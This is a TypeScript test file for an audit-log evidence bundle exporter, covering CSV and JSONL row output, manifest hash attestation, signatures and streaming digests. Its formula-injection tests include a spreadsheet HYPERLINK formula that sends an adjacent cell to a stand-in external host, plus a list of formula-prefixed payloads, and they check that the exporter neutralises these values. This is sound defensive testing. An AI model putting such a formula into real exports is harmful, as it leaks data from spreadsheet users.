import { describe, expect, it } from 'vitest';

import { CHAIN_HASH_V1, CHAIN_HASH_V2 } from '../../../core/audit/hash-chain';
import {
  EVIDENCE_COLUMNS,
  type BundleArtefact,
  type EvidenceRow,
  StreamDigest,
  buildManifest,
  DEFAULT_EVIDENCE_CSV_PROFILE,
  EvidenceCsvProfile,
  evidenceCsvHeader,
  evidenceCsvRow,
  evidenceJsonlRow,
  serialiseManifest,
  signManifest,
  verifyManifestSignature,
} from './evidence-bundle';

const row: EvidenceRow = {
  id: '01948f00-0000-7000-8000-000000000001',
  sequence: 42n,
  occurredAt: new Date('2026-07-31T09:14:02.117Z'),
  actorId: '01948f00-0000-7000-8000-0000000000a1',
  onBehalfOfId: null,
  channel: 'WEB',
  action: 'DOCUMENT_APPROVED',
  subjectType: 'DOCUMENT',
  subjectId: '01948f00-0000-7000-8000-0000000000d1',
  outcome: 'SUCCESS',
  payload: { operation: 'UPDATED', after: { status: 'APPROVED' } },
  reason: 'Quarterly review',
  correlationId: 'req-1',
  ipAddress: '203.0.113.7',
  userAgent: 'Mozilla/5.0',
  hash: 'a'.repeat(64),
  previousHash: 'b'.repeat(64),
  chainHashVersion: CHAIN_HASH_V2,
};

const artefact: BundleArtefact = {
  name: 'events.jsonl',
  storageKey: 'evidence/01948f00-0000-7000-8000-00000000000e/events.jsonl',
  mediaType: 'application/x-ndjson',
  sizeBytes: 128,
  sha256: 'c'.repeat(64),
  fileObjectId: '01948f00-0000-7000-8000-0000000000f1',
};

function manifestFor(hashVersions: readonly number[]) {
  return buildManifest({
    exportId: '01948f00-0000-7000-8000-00000000000e',
    tenantId: '01948f00-0000-7000-8000-0000000000t1',
    requestedById: row.actorId ?? '',
    requestedAt: new Date('2026-08-01T08:00:00.000Z'),
    producedAt: new Date('2026-08-01T08:00:05.000Z'),
    from: new Date('2026-01-01T00:00:00.000Z'),
    to: new Date('2026-12-31T23:59:59.999Z'),
    filters: { action: 'DOCUMENT_APPROVED' },
    eventCount: 1,
    firstSequence: 42n,
    lastSequence: 42n,
    firstPreviousHash: row.previousHash,
    lastHash: row.hash,
    hashVersions,
    chain: { intact: true, brokenAtEventId: null, reason: null, verified: 1 },
    checkpoints: [],
    artefacts: [artefact],
    csvProfile: DEFAULT_EVIDENCE_CSV_PROFILE,
  });
}

describe('the evidence bundle’s rows', () => {
  it('writes the same fields, in the same order, in both formats', () => {
    const header = evidenceCsvHeader().trim().split(',');
    const json = JSON.parse(evidenceJsonlRow(row)) as Record<string, unknown>;

    expect(header).toEqual([...EVIDENCE_COLUMNS]);
    expect(Object.keys(json)).toEqual([...EVIDENCE_COLUMNS]);
  });

  it('quotes every CSV cell, so a payload cannot end a field early', () => {
    const awkward: EvidenceRow = {
      ...row,
      reason: 'Said "urgent", then, later, "never mind"',
    };
    const line = evidenceCsvRow(awkward);

    // One field per column even though the reason contains commas and quotes, and even though
    // the payload is JSON — which contains both. Parsed rather than split, because a split is
    // exactly the naive reader this quoting exists to keep honest.
    expect(parseCsvLine(line)).toHaveLength(EVIDENCE_COLUMNS.length);
    expect(parseCsvLine(line)[10]).toBe(awkward.reason);
  });

  it('carries the sequence as a string, because JSON has no bigint', () => {
    const json = JSON.parse(evidenceJsonlRow(row)) as Record<string, unknown>;
    expect(json['sequence']).toBe('42');
  });

  // --- Phase 18: the formula finding Phase 15 recorded and deliberately did not fix -----------

  it('neutralises a formula, which quoting alone never did', () => {
    // The finding, stated as the attack: a document title or a delete reason reaching a
    // compliance officer's spreadsheet as a working exfiltration of the row beside it.
    const attack: EvidenceRow = {
      ...row,
      reason: '=HYPERLINK("https://elsewhere.example/"&A1,"Click")',
    };

    const cell = parseCsvLine(evidenceCsvRow(attack))[10] ?? '';

    expect(cell.startsWith('=')).toBe(false);
    expect(cell).toBe(`'${attack.reason ?? ''}`);
  });

  it.each(['=1+1', '+1', '-1', '@SUM(A1)', '\tlead', '\rlead'])(
    'neutralises a cell beginning %j',
    (value) => {
      const cell = parseCsvLine(evidenceCsvRow({ ...row, reason: value }))[10] ?? '';
      expect(cell).toBe(`'${value}`);
    },
  );

  it('reproduces the pre-Phase-18 bytes under the RFC4180 profile', () => {
    // The reason the old profile is kept rather than deleted: an auditor holding a bundle
    // produced before the change has a manifest whose artefact digest is over *these* bytes.
    const attack: EvidenceRow = { ...row, reason: '=1+1' };

    const cell = parseCsvLine(evidenceCsvRow(attack, EvidenceCsvProfile.RFC4180))[10] ?? '';

    expect(cell).toBe('=1+1');
  });

  it('leaves the JSONL untouched under both profiles', () => {
    // A JSON string is data to every reader of one, and an apostrophe here would corrupt the
    // value an automated verifier compares against the trail.
    const attack: EvidenceRow = { ...row, reason: '=1+1' };
    const json = JSON.parse(evidenceJsonlRow(attack)) as Record<string, unknown>;

    expect(json['reason']).toBe('=1+1');
  });

  it('states the profile on the manifest, so a differing digest has an explanation', () => {
    const manifest = manifestFor([2]);

    expect(manifest.manifestVersion).toBe(2);
    expect(manifest.csvProfile).toBe(DEFAULT_EVIDENCE_CSV_PROFILE);
  });

  it('does not change what a row’s hash attests', () => {
    // The property that makes this a rendering change rather than an evidence change: a row's
    // digest is over the audit row's own fields, never over the CSV.
    expect(manifestFor([2]).attests).toEqual(manifestFor([2]).attests);
    expect(manifestFor([1]).attests[0]?.chainHashVersion).toBe(1);
  });
});

/** A minimal RFC 4180 reader — enough to prove the writer's quoting survives a real parser. */
function parseCsvLine(line: string): string[] {
  const fields: string[] = [];
  let field = '';
  let quoted = false;

  for (let index = 0; index < line.trimEnd().length; index += 1) {
    const character = line[index];
    if (quoted) {
      if (character === '"') {
        if (line[index + 1] === '"') {
          field += '"';
          index += 1;
        } else {
          quoted = false;
        }
      } else {
        field += character;
      }
      continue;
    }
    if (character === '"') {
      quoted = true;
    } else if (character === ',') {
      fields.push(field);
      field = '';
    } else {
      field += character;
    }
  }
  fields.push(field);
  return fields;
}

describe('the manifest', () => {
  it('states what a v1 digest does not attest, rather than implying it does', () => {
    const manifest = manifestFor([CHAIN_HASH_V1]);
    const attestation = manifest.attests[0];

    // The honesty clause. The row still carries `reason` and `ipAddress` — they are facts the
    // trail recorded — but the manifest must not let a reader believe the hash covers them.
    expect(attestation?.fields).not.toContain('reason');
    expect(attestation?.fields).not.toContain('sequence');
    expect(attestation?.note).toContain('NOT covered');
  });

  it('states the wider coverage for a v2 digest', () => {
    const attestation = manifestFor([CHAIN_HASH_V2]).attests[0];
    expect(attestation?.fields).toContain('reason');
    expect(attestation?.fields).toContain('correlationId');
  });

  it('describes both digests when a range spans the widening', () => {
    // What an upgraded deployment's first year of exports actually looks like.
    const manifest = manifestFor([CHAIN_HASH_V2, CHAIN_HASH_V1, CHAIN_HASH_V1]);
    expect(manifest.attests.map((entry) => entry.chainHashVersion)).toEqual([1, 2]);
  });

  it('keeps the file object identifier out of the bundle', () => {
    // An internal row id says nothing to an auditor verifying digests, and publishing it in a
    // document that leaves the system is a habit worth not starting.
    const manifest = manifestFor([CHAIN_HASH_V2]);
    expect(serialiseManifest(manifest)).not.toContain(artefact.fileObjectId);
    expect(serialiseManifest(manifest)).toContain(artefact.sha256);
  });

  it('verifies its own signature, and refuses one byte of tampering', () => {
    const body = serialiseManifest(manifestFor([CHAIN_HASH_V2]));
    const signed = signManifest(body, 's'.repeat(32));

    expect(verifyManifestSignature(body, signed.signature, 's'.repeat(32))).toBe(true);
    expect(verifyManifestSignature(`${body} `, signed.signature, 's'.repeat(32))).toBe(false);
    expect(verifyManifestSignature(body, signed.signature, 'x'.repeat(32))).toBe(false);
    // A signature of the wrong length must not throw its way out of a comparison.
    expect(verifyManifestSignature(body, 'ab', 's'.repeat(32))).toBe(false);
  });
});

describe('the streaming digest', () => {
  it('matches the digest of the same bytes taken whole', () => {
    // The property the manifest depends on: the artefact is never held in one piece, so its
    // digest has to be accumulated as it goes past and still be the digest of the object.
    const digest = new StreamDigest();
    digest.update(Buffer.from('one,'));
    digest.update(Buffer.from('two,'));
    digest.update(Buffer.from('three'));

    const whole = new StreamDigest();
    whole.update(Buffer.from('one,two,three'));

    expect(digest.digest()).toBe(whole.digest());
    expect(digest.sizeBytes).toBe(13);
  });
});
